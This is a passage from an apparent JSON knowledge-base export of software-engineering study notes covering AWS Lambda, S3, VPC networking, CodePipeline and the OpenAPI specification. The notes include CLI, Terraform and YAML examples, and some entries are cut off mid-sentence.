Instead of try/catch in every handler, use `middy` to chain error handling, input parsing, and validation as reusable middleware. Keeps handlers to ~5 lines.\n- **Shared Schemas:** Extract OpenAPI `components/schemas` into separate files and `$ref` them. Prevents schema duplication across endpoints.\n- **Config Libraries:** Tools like `@aws-sdk/client-ssm` (Parameter Store) or `@aws-sdk/client-secrets-manager` let you pull sensitive config at runtime instead of baking it into deploy packages."
    },
    {
      "id": "swe/aws-cloud/aws-lambda-vs-lambda-handler",
      "title": "Lambda Configuration (AWS Console or Infrastructure as Code)",
      "path": [
        "swe",
        "aws-cloud",
        "aws-lambda-vs-lambda-handler"
      ],
      "content": "Great question! Let me clarify the distinction:\n\n## Lambda vs Lambda Handler\n\n**Lambda (the service):**\n- The entire AWS managed compute service\n- Includes: runtime environment, execution role, memory allocation, timeout settings, triggers, logs, metrics, etc.\n- The \"container\" that runs your code\n\n**Lambda Handler (the function):**\n- The specific entry point function *within* your Lambda\n- Just the JavaScript/Python/etc. function that AWS calls\n- The actual code that processes events\n\n## Analogy\n\nThink of it like a restaurant:\n\n- **Lambda** = The entire restaurant (building, kitchen, staff, equipment, operating hours)\n- **Lambda Handler** = The chef's recipe that gets executed when an order comes in\n\n## Concrete Example\n\n```javascript\n// THIS IS THE HANDLER - just the function\nexports.handler = async (event, context) => {\n  return { statusCode: 200, body: 'Hello' };\n};\n```\n\nBut to actually use this handler, you need to configure the **Lambda**:\n\n```yaml\n# Lambda Configuration (AWS Console or Infrastructure as Code)\nFunctionName: my-api-function\nRuntime: nodejs18.x\nHandler: index.handler        # Points to your handler function\nMemorySize: 512\nTimeout: 30\nEnvironment:\n  Variables:\n    DB_HOST: database.example.com\nTriggers:\n  - API Gateway (GET /users)\n  - S3 bucket upload\nIAM Role: lambda-execution-role\n```\n\n## Why the Article Focused on Handlers\n\nThe article focused on **handlers** because that's the part *you write*. AWS manages the Lambda service itself—you just need to understand:\n\n1. **How to structure your handler function** (the signature, parameters)\n2. **What data format to expect** (event structure from different triggers)\n3. **How to return responses** (proper format for API Gateway, etc.)\n4. **Best practices** (error handling, cold starts, etc.)\n\n## What a \"Lambda\" Article Would Cover\n\nA broader \"Lambda\" article would include:\n- Lambda service concepts (execution model, pricing)\n- Configuration (memory, timeout, concurrency limits)\n- Triggers/event sources (API Gateway, S3, DynamoDB, etc.)\n- IAM roles and permissions\n- Deployment strategies (ZIP files, container images, layers)\n- Monitoring (CloudWatch Logs, X-Ray tracing)\n- VPC configuration\n- Cost optimization\n\nThe handler article was specifically about **writing the code** that runs inside Lambda, not about Lambda as a whole service.\n\n"
    },
    {
      "id": "swe/aws-cloud/aws-lambdas",
      "title": "AWS Lambda: A Well-Structured Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-lambdas"
      ],
      "content": "# AWS Lambda: A Well-Structured Overview\n\nAWS Lambda is a serverless compute service that lets you run code in response to events without provisioning or managing servers. It automatically scales and charges only for compute time consumed.\n\n## Key Points\n\n- **Serverless:** No need to manage infrastructure; AWS handles scaling and availability.\n- **Event-Driven:** Triggers include HTTP requests (API Gateway), S3 uploads, DynamoDB changes, scheduled events, and more.\n- **Pay-per-Use:** You pay only for the compute time your code actually uses.\n- **Language Support:** Supports Node.js, Python, Java, Go, .NET, Ruby, and custom runtimes.\n- **Stateless:** Each invocation is independent; persistent state must be stored externally.\n- **Resource Limits:** Memory, execution time, and package size are limited.\n- **Integration:** Easily connects with other AWS services for building complex workflows.\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Lambda Function (Node.js)**\n\n   ```js\n   exports.handler = async (event) => {\n     return { statusCode: 200, body: \"Hello from Lambda!\" };\n   };\n   ```\n\n2. **Creating a Lambda (AWS Console)**\n\n   - Choose runtime and upload code or write inline.\n   - Set triggers (e.g., API Gateway, S3).\n   - Configure environment variables and permissions (IAM role).\n\n3. **Triggering a Lambda**\n   - HTTP request via API Gateway.\n   - File upload to S3 bucket.\n   - Scheduled event (CloudWatch Events).\n\n## Common Pitfalls\n\n- Exceeding resource limits (timeout, memory, package size).\n- Not handling cold starts (initial latency after inactivity).\n- Forgetting to set correct IAM permissions for Lambda to access other AWS resources.\n- Not managing state externally (e.g., using S3, DynamoDB).\n\n## Practical Applications\n\n- Building REST APIs and microservices.\n- Real-time file processing (images, logs, data).\n- Automation and scheduled tasks.\n- Event-driven data pipelines and integrations.\n\n## References\n\n- [AWS Lambda Documentation](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)\n- [Serverless Framework](https://www.serverless.com/)\n- [AWS Lambda Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Layers:** Share code and dependencies across multiple Lambda functions.\n- **Provisioned Concurrency:** Reduce cold start latency for critical functions.\n- **VPC Integration:** Access private resources in your AWS Virtual Private Cloud.\n- **Monitoring & Logging:** Use CloudWatch for metrics, logs, and alerts.\n- **Deployment Automation:** Use tools like AWS SAM, Serverless Framework,\n"
    },
    {
      "id": "swe/aws-cloud/aws-s3",
      "title": "AWS S3 (Simple Storage Service): A Well-Structured Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-s3"
      ],
      "content": "# AWS S3 (Simple Storage Service): A Well-Structured Overview\n\nAWS S3 is a highly scalable, durable object storage service that stores and retrieves any amount of data from anywhere on the web, commonly used for backups, static assets, data lakes, and application storage.\n\n## Key Points\n\n- **Definition:** Object storage service that stores data as objects within buckets, accessed via HTTP/HTTPS APIs rather than traditional file systems.\n- **Durability & Availability:** Designed for 99.999999999% (11 nines) durability and 99.99% availability through redundant storage across multiple facilities.\n- **Storage Classes:** Multiple tiers (Standard, Intelligent-Tiering, Glacier, etc.) optimized for different access patterns and cost requirements.\n- **Scalability:** Virtually unlimited storage capacity with automatic scaling—no capacity planning required.\n- **Security:** Supports encryption at rest and in transit, IAM policies, bucket policies, and ACLs for fine-grained access control.\n- **Versioning:** Optional feature to preserve, retrieve, and restore every version of every object.\n- **Global Access:** Objects accessible globally via unique URLs, with optional CloudFront CDN integration for edge caching.\n\n## Step-by-Step Explanation & Examples\n\n1. **Creating a Bucket**\n   ```bash\n   # AWS CLI\n   aws s3 mb s3://my-app-bucket --region us-west-2\n   \n   # Buckets must have globally unique names\n   ```\n\n2. **Uploading Objects**\n   ```bash\n   # Single file upload\n   aws s3 cp myfile.jpg s3://my-app-bucket/images/\n   \n   # Upload directory recursively\n   aws s3 sync ./local-folder s3://my-app-bucket/folder/\n   ```\n\n3. **Downloading Objects**\n   ```bash\n   # Download single file\n   aws s3 cp s3://my-app-bucket/images/myfile.jpg ./downloads/\n   \n   # Download entire bucket\n   aws s3 sync s3://my-app-bucket ./local-backup/\n   ```\n\n4. **Listing Objects**\n   ```bash\n   # List all objects in bucket\n   aws s3 ls s3://my-app-bucket/\n   \n   # List with prefix (folder-like structure)\n   aws s3 ls s3://my-app-bucket/images/ --recursive\n   ```\n\n5. **Setting Object Permissions**\n   ```bash\n   # Make object publicly readable\n   aws s3api put-object-acl --bucket my-app-bucket --key myfile.jpg --acl public-read\n   \n   # Or use bucket policy for broader rules\n   ```\n\n6. **Programmatic Access (Python/Boto3)**\n   ```python\n   import boto3\n   \n   s3 = boto3.client('s3')\n   \n   # Upload file\n   s3.upload_file('local.jpg', 'my-app-bucket', 'images/remote.jpg')\n   \n   # Download file\n   s3.download_file('my-app-bucket', 'images/remote.jpg', 'downloaded.jpg')\n   \n   # Generate presigned URL (temporary access)\n   url = s3.generate_presigned_url('get_object',\n       Params={'Bucket': 'my-app-bucket', 'Key': 'private.pdf'},\n       ExpiresIn=3600)\n   ```\n\n## Common Pitfalls\n\n- Making buckets or objects public unintentionally, creating security vulnerabilities.\n- Not using lifecycle policies to transition old data to cheaper storage classes, resulting in unnecessary costs.\n- Ignoring regional considerations—data transfer between regions incurs charges.\n- Treating S3 like a file system with frequent small updates—S3 is optimized for larger, less frequent operations.\n- Not implementing versioning or backups before bulk delete operations.\n- Overlooking request costs—millions of small GET requests can add up significantly.\n- Using sequential key names (e.g., timestamps) which can create performance hotspots in high-throughput scenarios.\n\n## Practical Applications\n\n- **Static Website Hosting:** Serve HTML, CSS, JS files directly from S3 with CloudFront for global distribution.\n- **Application File Storage:** Store user uploads, documents, images, and videos with presigned URLs for secure access.\n- **Backup & Disaster Recovery:** Archive databases, logs, and critical data with cross-region replication.\n- **Data Lakes:** Centralized repository for structured and unstructured data for analytics and machine learning.\n\n**Example anecdote:** At a previous company, we stored user-uploaded photos directly on our application server, which worked fine until we scaled horizontally. Users on server A couldn't see photos uploaded via server B. Migrating to S3 solved this immediately—all servers accessed the same storage, and we got automatic backups and CDN integration as a bonus.\n\n## References\n\n- [AWS S3 Documentation](https://docs.aws.amazon.com/s3/)\n- [AWS S3 Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/best-practices.html)\n- [S3 Pricing Calculator](https://aws.amazon.com/s3/pricing/)\n- [Boto3 S3 Documentation](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Storage Classes:**\n  - **S3 Standard:** Frequent access, millisecond latency\n  - **S3 Intelligent-Tiering:** Automatically moves objects between tiers based on access patterns\n  - **S3 Standard-IA/One Zone-IA:** Infrequent access with lower storage costs\n  - **S3 Glacier Instant/Flexible/Deep Archive:** Long-term archival with retrieval times from minutes to hours\n- **Lifecycle Policies:** Automate transitions between storage classes and expiration (e.g., move to Glacier after 90 days, delete after 7 years).\n- **Versioning:** Keep multiple variants of objects to protect against accidental deletions and overwrites.\n- **Cross-Region Replication (CRR):** Automatically replicate objects across AWS regions for compliance or latency optimization.\n- **Event Notifications:** Trigger Lambda functions, SQS, or SNS when objects are created, deleted, or modified.\n- **S3 Select & Glacier Select:** Query data directly in S3 using SQL without downloading entire objects.\n- **Object Lock:** WORM (Write Once Read Many) model for regulatory compliance, preventing object deletion.\n- **Multipart Upload:** Split large files (>100MB) into parts for parallel uploads, improving speed and reliability.\n- **Transfer Acceleration:** Use CloudFront edge locations to speed up uploads from distant geographic locations.\n- **Presigned URLs:** Generate temporary URLs for secure, time-limited access without exposing credentials.\n- **S3 Access Points:** Simplified access management for shared datasets with multiple applications.\n- **Bucket Policies vs IAM Policies:** Bucket policies attach to resources, IAM policies attach to users/roles—use both for defense in depth.\n- **Server-Side Encryption:** SSE-S3 (AWS-managed), SSE-KMS (customer-managed keys), SSE-C (customer-provided keys).\n- **Requester Pays:** Transfer costs billed to requester instead of bucket owner for public datasets.\n- **S3 Batch Operations:** Perform bulk operations (copy, tag, restore) on billions of objects at scale.\n- **Performance Optimization:** Use random prefixes for key names to distribute load across partitions in high-throughput scenarios."
    },
    {
      "id": "swe/aws-cloud/aws-vpc",
      "title": "AWS VPC (Virtual Private Cloud): Complete Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-vpc"
      ],
      "content": "# AWS VPC (Virtual Private Cloud): Complete Overview\n\nAWS VPC is a logically isolated virtual network within AWS where you launch and connect your cloud resources. It gives you complete control over your network environment, including IP address ranges, subnets, route tables, and network gateways. Think of a VPC as your own private data center in the cloud—you define the network topology, control traffic flow, and decide what can communicate with the outside world.\n\n## Key Points\n\n- **Purpose:** Isolated network environment for your AWS resources\n- **Components:** Subnets, route tables, internet gateways, NAT gateways, security groups\n- **IP Addressing:** You define CIDR blocks (e.g., 10.0.0.0/16)\n- **Subnets:** Public subnets (internet-accessible) and private subnets (isolated)\n- **Security:** Network ACLs and security groups control inbound/outbound traffic\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic VPC Creation**\n\n   ```\n   VPC CIDR: 10.0.0.0/16\n   └─ Provides 65,536 IP addresses (10.0.0.0 to 10.0.255.255)\n   \n   Resources:\n   - VPC ID: vpc-abc123\n   - Region: us-east-1\n   - Default route table, network ACL, security group created automatically\n   ```\n   \n   **Analogy:** Like buying a plot of land (10.0.0.0/16) where you'll build your infrastructure. The /16 determines how much space you have.\n\n2. **Subnets (Public and Private)**\n\n   ```\n   VPC: 10.0.0.0/16\n   \n   Public Subnet (us-east-1a): 10.0.1.0/24\n   └─ 256 IPs, has internet gateway route\n   └─ Use for: Load balancers, bastion hosts, NAT gateways\n   \n   Private Subnet (us-east-1a): 10.0.2.0/24\n   └─ 256 IPs, no direct internet access\n   └─ Use for: Application servers, databases\n   \n   Public Subnet (us-east-1b): 10.0.3.0/24\n   └─ High availability - second AZ\n   \n   Private Subnet (us-east-1b): 10.0.4.0/24\n   └─ High availability - second AZ\n   ```\n   \n   **Key difference:** Public subnets have a route to an Internet Gateway (0.0.0.0/0 → igw-xyz), private subnets don't.\n\n3. **Internet Gateway (IGW) for Public Access**\n\n   ```\n   Internet Gateway: igw-123abc\n   └─ Attached to VPC: vpc-abc123\n   \n   Route Table (Public):\n   Destination       Target\n   10.0.0.0/16      local         (VPC internal traffic)\n   0.0.0.0/0        igw-123abc    (Internet traffic)\n   \n   Associated Subnets: 10.0.1.0/24, 10.0.3.0/24\n   \n   EC2 in public subnet (10.0.1.50) can now reach internet\n   ```\n   \n   **Analogy:** Internet Gateway is like the front door of your house—allows traffic in and out to the public internet.\n\n4. **NAT Gateway for Private Subnet Internet Access**\n\n   ```\n   NAT Gateway: nat-xyz789\n   └─ Located in PUBLIC subnet: 10.0.1.0/24\n   └─ Elastic IP: 52.123.45.67\n   \n   Route Table (Private):\n   Destination       Target\n   10.0.0.0/16      local\n   0.0.0.0/0        nat-xyz789    (Outbound only through NAT)\n   \n   Associated Subnets: 10.0.2.0/24, 10.0.4.0/24\n   \n   Use case: Private EC2 instances can download updates from internet,\n             but internet cannot initiate connections to them\n   ```\n   \n   **Analogy:** NAT Gateway is like a security guard who lets your employees (private instances) go outside but doesn't let strangers come in.\n\n5. **Security Groups (Stateful Firewall)**\n\n   ```\n   Security Group: sg-web-servers\n   \n   Inbound Rules:\n   Type        Protocol  Port    Source\n   HTTP        TCP       80      0.0.0.0/0\n   HTTPS       TCP       443     0.0.0.0/0\n   SSH         TCP       22      10.0.1.0/24 (only from public subnet)\n   \n   Outbound Rules:\n   Type        Protocol  Port    Destination\n   All traffic All       All     0.0.0.0/0\n   \n   Applied to: EC2 instances in private subnet\n   \n   Note: Stateful = if inbound allowed, outbound response automatic\n   ```\n\n6. **Complete Three-Tier Architecture**\n\n   ```\n   VPC: 10.0.0.0/16\n   \n   PUBLIC SUBNETS (Internet-facing)\n   ├─ 10.0.1.0/24 (AZ-1): Application Load Balancer\n   └─ 10.0.2.0/24 (AZ-2): Application Load Balancer\n       ↓ (forwards traffic)\n   \n   PRIVATE SUBNETS (Application tier)\n   ├─ 10.0.11.0/24 (AZ-1): Web/App servers (EC2, ECS)\n   └─ 10.0.12.0/24 (AZ-2): Web/App servers (EC2, ECS)\n       ↓ (database connections)\n   \n   PRIVATE SUBNETS (Database tier)\n   ├─ 10.0.21.0/24 (AZ-1): RDS Primary\n   └─ 10.0.22.0/24 (AZ-2): RDS Standby\n   \n   NAT Gateway in each public subnet for private subnet internet access\n   ```\n\n## Common Pitfalls\n\n- Not planning CIDR blocks carefully (can't change VPC CIDR after creation easily)\n- Forgetting to attach Internet Gateway to route table (no internet access)\n- Placing NAT Gateway in private subnet instead of public\n- Not spreading subnets across multiple Availability Zones (no HA)\n- Overly permissive security group rules (0.0.0.0/0 for SSH is dangerous)\n- Confusing security groups (stateful) with NACLs (stateless)\n- Running out of IP addresses by using too small CIDR blocks (/28, /27)\n\n## Practical Applications\n\n- Hosting web applications (public load balancers, private app servers)\n- Multi-tier architectures (web, app, database layers isolated)\n- Hybrid cloud connectivity (VPN or Direct Connect to on-premises)\n- Microservices architectures (isolated subnets per service)\n- Compliance requirements (private subnets for sensitive data)\n\n## References\n\n- [AWS VPC Documentation](https://docs.aws.amazon.com/vpc/)\n- [AWS VPC User Guide](https://docs.aws.amazon.com/vpc/latest/userguide/)\n- [AWS VPC Subnets](https://docs.aws.amazon.com/vpc/latest/userguide/configure-subnets.html)\n- [AWS Security Groups](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-groups.html)\n- [CIDR.xyz Calculator](https://cidr.xyz/) - Subnet calculator tool\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **CIDR Block Planning:**\n  ```\n  Common VPC sizes:\n  /16 = 65,536 IPs  → Large organizations, many services\n  /20 = 4,096 IPs   → Medium-sized applications\n  /24 = 256 IPs     → Small applications, dev environments\n  \n  Reserved IPs per subnet (AWS uses 5):\n  10.0.1.0   - Network address\n  10.0.1.1   - VPC router\n  10.0.1.2   - DNS server\n  10.0.1.3   - Future use\n  10.0.1.255 - Broadcast address\n  \n  Usable: 256 - 5 = 251 IPs per /24 subnet\n  ```\n\n- **VPC Peering (Connect Multiple VPCs):**\n  ```\n  VPC A (10.0.0.0/16) <--Peering--> VPC B (172.16.0.0/16)\n  \n  Route Table (VPC A):\n  Destination       Target\n  10.0.0.0/16      local\n  172.16.0.0/16    pcx-123abc (peering connection)\n  \n  Use cases:\n  - Connect production and staging VPCs\n  - Share resources across accounts\n  - Multi-region applications\n  \n  Limitations:\n  - No transitive peering (A-B-C requires A-B and A-C connections)\n  - CIDR blocks cannot overlap\n  ```\n\n- **VPC Endpoints (Private AWS Service Access):**\n  ```\n  Without VPC Endpoint:\n  Private EC2 → NAT Gateway → Internet → S3 (public endpoint)\n  \n  With VPC Endpoint (Interface or Gateway):\n  Private EC2 → VPC Endpoint → S3 (private connection)\n  \n  Types:\n  1. Gateway Endpoints: S3, DynamoDB (free, route table entry)\n  2. Interface Endpoints: Most AWS services (ENI in subnet, costs $)\n  \n  Benefits:\n  - No internet gateway or NAT required\n  - Lower latency, better security\n  - Reduced data transfer costs\n  ```\n\n- **Network ACLs vs Security Groups:**\n  ```\n  Network ACLs (Subnet level):\n  - Stateless (must allow both inbound and outbound)\n  - Numbered rules (evaluated in order)\n  - Can DENY traffic explicitly\n  - Applied to entire subnet\n  \n  Security Groups (Instance level):\n  - Stateful (return traffic automatic)\n  - All rules evaluated\n  - Can only ALLOW (default deny)\n  - Applied to specific instances/ENIs\n  \n  Example NACL (Stateless):\n  Inbound:\n  100  Allow TCP 80  0.0.0.0/0\n  110  Allow TCP 443 0.0.0.0/0\n  *    Deny All\n  \n  Outbound:\n  100  Allow TCP 1024-65535 0.0.0.0/0  (ephemeral ports!)\n  *    Deny All\n  ```\n\n- **VPN and Direct Connect:**\n  ```\n  Site-to-Site VPN:\n  On-premises ↔ Virtual Private Gateway ↔ VPC\n  - Setup: Hours\n  - Speed: Up to 1.25 Gbps per tunnel\n  - Cost: Low (~$0.05/hour + data transfer)\n  - Use case: Quick hybrid cloud setup\n  \n  AWS Direct Connect:\n  On-premises ↔ Direct Connect Location ↔ VPC\n  - Setup: Weeks/months\n  - Speed: 1 Gbps to 100 Gbps\n  - Cost: Higher (port hours + data transfer)\n  - Use case: High bandwidth, consistent latency\n  ```\n\n- **Flow Logs (Network Traffic Monitoring):**\n  ```\n  VPC Flow Logs capture:\n  - Source/destination IPs\n  - Ports and protocols\n  - Bytes transferred\n  - Accept/reject decisions\n  \n  Example log entry:\n  2 123456789 eni-abc123 10.0.1.50 172.217.14.206 443 52000 6 25 5000 1637582400 1637582460 ACCEPT OK\n  \n  Useful for:\n  - Debugging connectivity issues\n  - Security analysis (detecting attacks)\n  - Compliance and auditing\n  ```\n\n- **Multi-AZ High Availability Pattern:**\n  ```\n  Region: us-east-1\n  \n  AZ-1 (us-east-1a)                AZ-2 (us-east-1b)\n  ├─ Public Subnet                 ├─ Public Subnet\n  │  └─ ALB (primary)              │  └─ ALB (secondary)\n  │  └─ NAT Gateway                │  └─ NAT Gateway\n  ├─ Private Subnet                ├─ Private Subnet\n  │  └─ EC2 Auto Scaling           │  └─ EC2 Auto Scaling\n  └─ DB Subnet                     └─ DB Subnet\n     └─ RDS Primary                   └─ RDS Standby\n  \n  If AZ-1 fails:\n  - ALB routes to AZ-2\n  - Auto Scaling launches in AZ-2\n  - RDS fails over to standby\n  ```\n\n- **Cost Optimization:**\n  ```\n  Expensive:\n  - NAT Gateway: ~$0.045/hour + $0.045/GB processed\n  - VPC Endpoints (Interface): ~$0.01/hour per AZ\n  - Data transfer between AZs: $0.01/GB\n  \n  Savings:\n  - Use single NAT Gateway (not per AZ) for non-critical\n  - VPC Gateway Endpoints free (S3, DynamoDB)\n  - Keep traffic within same AZ when possible\n  - Use VPC Endpoints instead of NAT for AWS services\n  ```\n\n- **Terraform Example (Infrastructure as Code):**\n  ```hcl\n  resource \"aws_vpc\" \"main\" {\n    cidr_block = \"10.0.0.0/16\"\n    enable_dns_hostnames = true\n    tags = { Name = \"production-vpc\" }\n  }\n  \n  resource \"aws_subnet\" \"public\" {\n    vpc_id = aws_vpc.main.id\n    cidr_block = \"10.0.1.0/24\"\n    availability_zone = \"us-east-1a\"\n    map_public_ip_on_launch = true\n  }\n  \n  resource \"aws_internet_gateway\" \"main\" {\n    vpc_id = aws_vpc.main.id\n  }\n  \n  resource \"aws_route_table\" \"public\" {\n    vpc_id = aws_vpc.main.id\n    route {\n      cidr_block = \"0.0.0.0/0\"\n      gateway_id = aws_internet_gateway.main.id\n    }\n  }\n  ```\n\n- **Best Practices:**\n  - Always use multiple AZs for production (minimum 2)\n  - Reserve IP space for growth (start with /16, use /24 subnets)\n  - Use separate subnets for different tiers (web, app, database)\n  - Enable VPC Flow Logs for troubleshooting and security\n  - Use descriptive tags (Environment, Application, Owner)\n  - Document your CIDR allocation strategy\n  - Test disaster recovery (simulate AZ failure)\n  - Use least privilege for security groups (specific IPs/ports)"
    },
    {
      "id": "swe/aws-cloud/cloud-pipelines-aws",
      "title": "AWS CloudPipelines: A Well-Structured Overview",
      "path": [
        "swe",
        "aws-cloud",
        "cloud-pipelines-aws"
      ],
      "content": "# AWS CloudPipelines: A Well-Structured Overview\n\nAWS CloudPipelines (commonly referring to AWS CodePipeline) is a fully managed continuous integration and continuous delivery (CI/CD) service that automates build, test, and deployment phases for applications on AWS and beyond.\n\n## Key Points\n\n- **Automation:** Orchestrates the flow of code from source to deployment using stages and actions.\n- **Integration:** Works with AWS services (CodeCommit, CodeBuild, CodeDeploy, S3, Lambda) and third-party tools (GitHub, Jenkins).\n- **Stages:** Pipelines are composed of stages (Source, Build, Test, Deploy) with customizable actions.\n- **Version Control:** Automatically triggers on code changes in repositories.\n- **Rollback & Approval:** Supports manual approval steps and automatic rollback on failure.\n- **Scalability:** Handles multiple pipelines and parallel deployments.\n- **Security:** Integrates with IAM for fine-grained access control.\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Pipeline Structure**\n   ```yaml\n   # Example pipeline stages (YAML-like for illustration)\n   stages:\n     - Source: GitHub\n     - Build: AWS CodeBuild\n     - Test: AWS CodeBuild\n     - Deploy: AWS CodeDeploy\n   ```\n\n2. **Creating a Pipeline (AWS Console)**\n   - Choose source provider (e.g., GitHub, CodeCommit).\n   - Add build stage (e.g., CodeBuild project).\n   - Add deploy stage (e.g., CodeDeploy, S3, Lambda).\n   - Configure triggers and approval steps.\n\n3. **Triggering a Pipeline**\n   - Push code to repository.\n   - Pipeline automatically starts, running each stage in sequence.\n\n## Common Pitfalls\n\n- Misconfiguring IAM roles, leading to permission errors.\n- Not handling failed builds or deployments (missing rollback).\n- Overcomplicating pipelines with too many manual steps.\n- Ignoring cost implications of frequent builds and deployments.\n\n## Practical Applications\n\n- Automating deployment of web and mobile applications.\n- Enforcing code quality with automated tests.\n- Managing infrastructure as code (IaC) deployments.\n- Integrating with monitoring and alerting for DevOps workflows.\n\n## References\n\n- [AWS CodePipeline Documentation](https://docs.aws.amazon.com/codepipeline/latest/userguide/welcome.html)\n- [AWS CI/CD Best Practices](https://aws.amazon.com/devops/continuous-delivery/)\n- [AWS CodeBuild Documentation](https://docs.aws.amazon.com/codebuild/latest/userguide/welcome.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Custom Actions:** Integrate custom scripts or third-party tools in pipeline stages.\n- **Cross-Account Pipelines:** Deploy across multiple AWS accounts for enterprise use.\n- **Pipeline as Code:** Define pipelines using AWS CloudFormation or CDK for versioned, repeatable infrastructure.\n- **Event-Driven Pipelines:** Trigger pipelines from events (e.g., S3 uploads, API calls).\n- **Monitoring & Auditing:** Use CloudWatch and CloudTrail for pipeline metrics and"
    },
    {
      "id": "swe/backend/api/openapi",
      "title": "OpenAPI Specification: Complete Overview",
      "path": [
        "swe",
        "backend",
        "api",
        "openapi"
      ],
      "content": "# OpenAPI Specification: Complete Overview\n\nOpenAPI (formerly Swagger) is a standard, language-agnostic specification for describing REST APIs. It provides a structured way to document endpoints, request/response formats, authentication, and errors in a machine-readable format (YAML or JSON). Think of it as a blueprint for your API that both humans and computers can understand—like architectural plans that describe exactly how a building should be constructed.\n\n## Key Points\n\n- **Purpose:** Standardized format for documenting REST APIs\n- **Format:** Written in YAML or JSON\n- **Version:** OpenAPI 3.x is current (replaces Swagger 2.0)\n- **Benefits:** Auto-generates docs, client SDKs, server stubs, and tests\n- **Ecosystem:** Works with tools like Swagger UI, Postman, code generators\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic API Definition**\n\n   ```yaml\n   openapi: 3.0.0\n   info:\n     title: Todo API\n     version: 1.0.0\n     description: A simple todo management API\n   servers:\n     - url: https://api.example.com/v1\n   ```\n\n2. **Defining an Endpoint**\n\n   ```yaml\n   paths:\n     /todos:\n       get:\n         summary: Get all todos\n         responses:\n           '200':\n             description: Successful response\n             content:\n               application/json:\n                 schema:\n                   type: array\n                   items:\n                     $ref: '#/components/schemas/Todo'\n   ```\n\n3. **Defining Request Body and Parameters**\n\n   ```yaml\n   paths:\n     /todos:\n       post:\n         summary: Create a new todo\n         requestBody:\n           required: true\n           content:\n             application/json:\n               schema:\n                 $ref: '#/components/schemas/TodoInput'\n         responses:\n           '201':\n             description: Todo created\n           '400':\n             description: Invalid input\n     \n     /todos/{id}:\n       get:\n         summary: Get todo by ID\n         parameters:\n           - name: id\n             in: path\n             required: true\n             schema:\n               type: integer\n   ```\n\n4. **Reusable Schemas (Components)**\n\n   ```yaml\n   components:\n     schemas:\n       Todo:\n         type: object\n         properties:\n           id:\n             type: integer\n             example: 1\n           title:\n             type: string\n             example: \"Buy groceries\"\n           completed:\n             type: boolean\n             example: false\n       \n       TodoInput:\n         type: object\n         required:\n           - title\n         properties:\n           title:\n             type: string\n             minLength: 1\n             maxLength: 200\n   ```\n\n5. **Authentication & Security**\n\n   ```yaml\n   components:\n     securitySchemes:\n       bearerAuth:\n         type: http\n         scheme: bearer\n         bearerFormat: JWT\n   \n   security:\n     - bearerAuth: []\n   \n   paths:\n     /todos:\n       get:\n         security:\n           - bearerAuth: []\n   ```\n\n## Common Pitfalls\n\n- Inconsistent naming conventions across endpoints (use camelCase or snake_case consistently)\n- Missing required fields or constraints in schemas\n- Not using `$ref` for reusable components (leads to duplication)\n- Forgetting to document error responses (4xx, 5xx)\n- Using OpenAPI 2.0 (Swagger) syntax instead of 3.x\n- Not validating spec files (use validators/linters before deploying)\n\n## Practical Applications\n\n- Auto-generating interactive API documentation (Swagger UI, Redoc)\n- Creating client libraries in multiple languages (TypeScript, Python, Java)\n- API testing and validation (ensuring requests/responses match spec)\n- Mock servers for frontend development before backend is ready\n- Contract testing between frontend and backend teams\n\n## References\n\n- [OpenAPI Specification Official Site](https://www.openapis.org/)\n- [OpenAPI 3.0 Specification](https://spec.openapis.org/oas/v3.0.3)\n- [Swagger Editor](https://editor.swagger.io/) - Interactive editor\n- [Swagger UI](https://swagger.io/tools/swagger-ui/) - Documentation generator\n- [OpenAPI Generator](https://openapi-generator.tech/) - Code generation tool\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Versioning:** Include version in URL (`/v1/`, `/v2/`) and `info.version` field. Use `servers` array for multiple environments (dev, staging, prod).\n\n- **Schema Composition:** Use `allOf`, `oneOf`, `anyOf` for complex types:\n  ```yaml\n  PaymentMethod:\n    oneOf:\n      - $ref: '#/components/schemas/CreditCard'\n      - $ref: '#/components/schemas/PayPal'\n  ```\n\n- **Response Examples:** Provide realistic examples for better documentation:\n  ```yaml\n  responses:\n    '200':\n      content:\n        application/json:\n          examples:\n            success:\n              value:\n                id: 42\n                title: \"Learn OpenAPI\"\n  ```\n\n- **Callbacks & Webhooks:** Document async operations where your API calls client URLs:\n  ```yaml\n  callbacks:\n    onPaymentComplete:\n      '{$request.body#/callbackUrl}':\n        post:\n          requestBody:\n            content:\n              application/json:\n                schema:\n                  $ref: '#/components/schemas/PaymentEvent'\n  ```\n\n- **Code Generation Workflow:** \n  1. Write OpenAPI spec first (design-first approach)\n  2. Generate server stubs for backend (saves boilerplate)\n  3. Generate client SDKs for frontend/mobile\n  4. Use spec for automated testing and validation\n\n- **Validation Tools:** Use tools like `swagger-cli validate`, `spectral`, or IDE plugins to catch errors early and enforce style guides\n\n- **Design Patterns:** Follow RESTful conventions—use proper HTTP methods (GET, POST, PUT, DELETE), status codes (200, 201, 400, 404, 500), and resource naming (plural nouns: `/users`, `/todos`)"
    },
    {
      "id": "swe/backend/api/url-parameter-types",
      "title": "URL Parameter Types: Complete Overview",
      "path": [
        "swe",
        "backend",
        "api",
        "url-parameter-types"
      ],
